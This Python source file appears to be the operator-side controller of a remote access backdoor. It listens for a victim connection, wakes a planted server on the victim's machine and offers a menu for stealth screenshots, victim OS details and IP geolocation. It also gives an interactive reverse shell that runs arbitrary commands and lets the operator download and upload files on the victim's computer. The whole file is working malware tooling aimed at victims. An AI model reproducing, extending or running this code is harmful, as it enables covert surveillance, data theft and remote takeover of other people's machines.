# -*- coding: utf-8 -*
import socket,os, platform, time, encrypted_connection, datetime, geolocalisation, threading, argparse
HOST = '0.0.0.0' #Set as every ip address can connect to the server.
PORT = 6969 #Set listening port.
defaultPath = None
def consoleCleaner(enterToContinue): #When called, clear the console. If called with True argument, wait for enter to continue.
    if enterToContinue == True :
        try:
            input("Press enter to continue")
        except SyntaxError:
            pass
    if  platform.system() == "Windows" :
        os.system('cls')
    else :
        os.system('clear')
def welcomme(): #Message to welcomme the user,called once at the MAIN LOOP start.
    print("       ___         ___   ___         ___         ___   ___         ___         ___         ___  \r")
    print("|   | |     |     |     |   | |\ /| |             |   |   |       |           |   | |\  | |     \r")
    print("| + | |-+-  |     |     |   | | + | |-+-          +   |   |       |-+-        |   | | + | |-+-  \r")
    print("|/ \| |     |     |     |   | |   | |             |   |   |       |           |   | |  \| |     \r")
    print("       ---   ---   ---   ---         ---               ---                -    ---         ---  \r")
    print("                                                                                                ")
def menu(menu): #Contain the menus used in the main loop (Main or Keylooger).
    if (menu == "principale"):
        print("+--------------------------+\n"
            "|         Menu             |\n"
            "+--------------------------+\n"
            "| 1. Screen that beach     |\n"
            "| 2. Os infos              |\n"
            "| 3. Reverse shell         |\n"
            "| 4. Expert Mode           |\n"
            "| 5. Upload file           |\n"
            "| 99. Exit                 |\n"
            "+--------------------------+")
    if (menu == "uploadfile"):
        if len(defaultPath) < len(currentDirectory):
            taille = len(currentDirectory) + 25
        else :
            taille = len(defaultPath) + 25
        print("+"+taille*"-"+"+\n"
        "[*] File uploaded to : "+ defaultPath +"\n"
        "+"+taille*"-"+"+\n"
        "[1] Modify Attacker path : "+ currentDirectory+"\n"
        "[2] Modify Chosen file : "+ chosenFile +"\n"
        "[3] Upload the file\n"
        "[99] Go back to main menu\n"
        "+"+taille*"-"+"+\n")
def uploadFileMenu():
    global pathToUpload
    global currentDirectory
    global chosenFile
    pathToUpload = defaultPath
    currentDirectory = os.getcwd()
    chosenFile = "Unknown"
    menu("uploadfile")
    choix = input("> ")
    while choix != "99" :
        consoleCleaner(False)
        if choix == "1" :
            print("[*] Current attacker path: "+ currentDirectory+"\n")
            newPath = input("Enter the new path : ")
            while True :
                if os.path.isdir(choix):
                    currentDirectory = newPath
                    print("Path has been changed to : "+ newPath)
                    time.sleep(1)
                    break
                elif newPath == "quit" :
                    break
                else :
                    print("Path doesn't exist")
                    time.sleep(1)
                consoleCleaner(False)
                print("[*] Current attacker path: "+ currentDirectory+"\n")
                newPath = input("Enter the new path : ")
            consoleCleaner(False)
        if choix == "2" :
            i= 1
            fileString = ""
            while True :
                print("PICK A FILE BY HIS NAME : \n\n")
                fileList = os.listdir(currentDirectory)
                print("┌------ " + currentDirectory)
                for files in fileList :
                    fileString +=  "|-- ["+str(i)+ "] "+ files + "\n"
                    i += 1
                print(fileString + "└-- ["+str(i)+ "] Leave.")
                fileChoiceNum = input("> ")
                if int(fileChoiceNum) != (len(fileList) + 1) :
                    fileChoicePath = fileList[int(fileChoiceNum)-1]
                    if os.path.isfile(currentDirectory+"/"+fileChoicePath) :
                        print("File has been set to : "+ fileChoicePath)
                        chosenFile = fileChoicePath
                        time.sleep(1)
                        consoleCleaner(False)
                        break
                    else :
                        print("Path or file doesn't exist")
                else :
                    consoleCleaner(False)
                    break
        if choix == "3" :
            if chosenFile != "Unknown" :
                try:
                    uploadFile(currentDirectory, chosenFile)
                    print("File has been uploaded !")
                    consoleCleaner(True)
                except :
                    print("Upload failed !")
                    consoleCleaner(True)
            else:
                print("Choose a file before uploading !")
                consoleCleaner(True)
        menu("uploadfile")
        choix = input(">")
    consoleCleaner(False)
def selection(menu,choix) : #Switch case, to dispatch menu possibilities.
    if menu == "principale" :
        if choix == "1" :
            print("Let's see that screen !")
            screenThatbeach()
            return True
        elif choix == "2" :
            print("Hum, let's discover !")
            print("\n\n" + OsVictimInfos + "\n\n")
            consoleCleaner(True)
            return True
        elif choix == "3" :
            print("Good choice, let's get in !")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(False, False)
            return True
        elif choix == "4" :
            print("Let's go deeper !")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(True, True)
            return True
        elif choix == "5" :
            print("Let's upload some files !")
            time.sleep(1)
            consoleCleaner(False)
            uploadFileMenu()
            return True
        elif choix == "99" :
            print("Exit mode :\n"
                        "[1] Exit client\n"
                        "[2] Exit client & server\n")
            choix = input("> ")
            while True :
                if choix == "1":
                    ClientThreadVar.stop()
                    ClientThreadVar.join()
                    break
                elif choix == "2":
                    ClientThreadVar.Quit()
                    ClientThreadVar.join()
                    break
                else :
                    print("Bad choice, try again !")
                    time.sleep(1)
                    consoleCleaner(False)
                print("Exit mode :\n"
                        "[1] Exit client\n"
                        "[2] Exit client & server\n")
                choix = input("> ")
            print("\nSee you later !")
            encrypter.send_message_server("exit")
            time.sleep(1.5)
            consoleCleaner(False)
            return False
        else :
            print("Bad choice, try again !")
            time.sleep(1)
            consoleCleaner(False)
            return True
def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.
    global defaultPath
    encrypter.send_message_server("cd "+ defaultPath)
    encrypter.receive_message_server()
    client_path = defaultPath
    while True:
        command = input(client_path+ " > ")
        if((command == "stb") & (screenThatbeachAcces == False)) :
            print("Acces forbidden")
        elif((command == "stb") & (screenThatbeachAcces == True)):
            print("taking the screenshot")
            screenThatbeach()
        elif("dl" in command):
            try :
                command_split = command.split()
                downloadFile(command_split[1])
            except :
                print("No file name !")
        elif("upload" in command):
            currentDirectory = os.getcwd()
            try :
                command_split = command.split()
                if command_split[1] == "?" :
                    i = 1
                    fileList = os.listdir(currentDirectory)
                    fileString = ""
                    print("┌------ " + currentDirectory)

                    for files in fileList :
                        if i == (len(fileList)) :
                            fileString +=  "└-- "+ files + "\n"
                        else :
                            fileString +=  "|-- "+ files + "\n"
                        i += 1
                    print(fileString)
                else :
                    uploadFile(currentDirectory,command_split[1])
                    print("The file has been uploaded !")
            except :
                print("No file name !")
        elif((command == "keylogger") & (keyLogger == False)):
            print("Acces forbidden")    
        elif((command == "keylogger") & (keyLogger == True)):
            print("Not available now !")
            #client_socket.send(command.encode("utf-8"))
        elif(command == "state"):
            print(OsVictimInfos)
        elif(command == "home"):
            encrypter.send_message_server("cd "+ defaultPath)
            client_path = defaultPath
            encrypter.receive_message_server()
        elif(command == "clear"):
            consoleCleaner(False)
        elif(command == "quit"):
            consoleCleaner(False)
            break
        else :
            try:
                if(len(command.split()) != 0):
                    encrypter.send_message_server(command)
                    message = encrypter.receive_message_server()
                    if "Directory : " in str(message) :
                        try :
                            useless, client_path = message.split(" : ")
                        except :
                            print("No path has been sent.")
                    else :
                        print(message)
                else:
                    print("continue")
                    continue
            except(EOFError):
                    print("Invalid input, type 'help' to get a list of implemented commands.\n")
                    continue
def screenThatbeach(): #If chosen, take a stealth screenshot of the victim and save it in the .py executed path.
    encrypter.send_message_server("stb")
    captureName = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    path = "captures"
    #try :
    if encrypter.DownloadFile(path, captureName):
        print("Download sucessful.")
        os.system("qlmanage -p " + path + "/"+ captureName + ">/dev/null 2>&1" )
        consoleCleaner(False)
    else :
        print("You do not have permissions to create a file there.")
#except :
    print("Problem in definition.")
    consoleCleaner(True)
def downloadFile(fileName : str): #Download a selected file on victim's pc and save it in downloaded_files
    encrypter.send_message_server("dl "+ fileName)
    path = "downloaded_files"
    try :
        if encrypter.DownloadFile(path, fileName):
            print("Download sucessful.")
            os.system("qlmanage -p " + path + "/"+ fileName + ">/dev/null 2>&1" )
            consoleCleaner(False)
        else :
            print("The file you want to download doesn't exist !")
    except :
        print("Problem in definition.")
        consoleCleaner(True)
def uploadFile(pathOfFile : str, fileToUpload : str): #Upload a file from attacker pc to default the default victim's path
    encrypter.send_message_server("upload " + fileToUpload)
    encrypter.UploadFile(fileToUpload)
def findUser(tupleArray : tuple): #Return the victim's user name and set the default path.
    global defaultPath
    tupleArray = tupleArray.split("\n")
    useless, arg = tupleArray[3].split(" : ")
    useless, defaultPath = tupleArray[4].split(" : ")
    return arg
def check_arg(args=None): #Argparser that let the user use 2 arguments. /!\See the documentation/!\ 
    parser = argparse.ArgumentParser(description='F_ONE BECAUSE IT IS LITTERALLY THE FIRST ONE')
    parser.add_argument('-H', '--host',
                        help='host ip',
                        default='localhost')
    parser.add_argument('-p', '--port',
                        help='port of the web server',
                        default='6970')

    results = parser.parse_args(args)
    return (results.host,
            results.port)
class ClientThread(threading.Thread) : #Thread that connect to the listening victim's pc and wake client on victim's pc
    def __init__(self, HostClient: str,PortClient : int):
        super().__init__()
        self.stop_thread = False
        self.HOST = HostClient
        self.PORT = PortClient
    def run(self):
        global clientConnexion
        try :
            clientConnexion = encrypted_connection.client(b"d41d8cd98f00b205")
            clientConnexion.initialize_tcp_connexion_client(self.HOST,self.PORT)
        except :
            self.stop_thread =True
        if not self.stop_thread :
            command = clientConnexion.receive_message_client()
            if command == "online":
                    clientConnexion.send_message_client("localhost 6969")
                    clientConnexion.send_message_client("wake")
            while not self.stop_thread:
                pass
            print("Send shutdown to client")
            clientConnexion.send_message_client("shutdown")
            time.sleep(1)
            clientConnexion.close_tcp_connexion_client()
    def Quit(self):
        clientConnexion.send_message_client("quit")
        self.stop_thread = True
    def stop(self):
        self.stop_thread = True

# STARTING MAIN LOOP.
#Getting the client ip and client port from argparser.
hostClient, portClient= check_arg()
#Initializing variable with the ClientThread class and filling the case with previous ip and port.
ClientThreadVar = ClientThread(str(hostClient), int(portClient))
#Staring the thread, and connection to the victim's Server.
ClientThreadVar.start()
#Calling the function to set the secret key
encrypter = encrypted_connection.server(b"d41d8cd98f00b205")
#Calling the function to create the TCP server with specified PORT & HOST.
client_ip = encrypter.initialize_tcp_connexion_server(HOST,PORT)
#Call geolocalisation class to try geolocating approximately the victim with his ip.
victimLocalisation = geolocalisation.GeoLocalisation(client_ip).locate()
consoleCleaner(False)
#Getting victim's os infos.
OsVictimInfos = encrypter.receive_message_server()
#Set the variable defaultpath with victim's default path, and extract the user name.
user = findUser(OsVictimInfos)

#Create a variable that is used to exit from the loop.
exitBackDoorLoop = True
if OsVictimInfos == "exit":
    exitBackDoorLoop = False

#Starting the main loop and waiting for exitBackDoorLoop to change to False.
while exitBackDoorLoop :
    #Show the banner.
    welcomme()
    print("[*] " + user + " connected from " + client_ip + "\n")
    print("[*] Localisation : "+ victimLocalisation +"\n")
    print("[*] Default path : "+ defaultPath +"\n")
    menu("principale")
    exitBackDoorLoop = selection("principale",input("> "))
#Close the server tcp connexion
encrypter.close_tcp_connexion_server()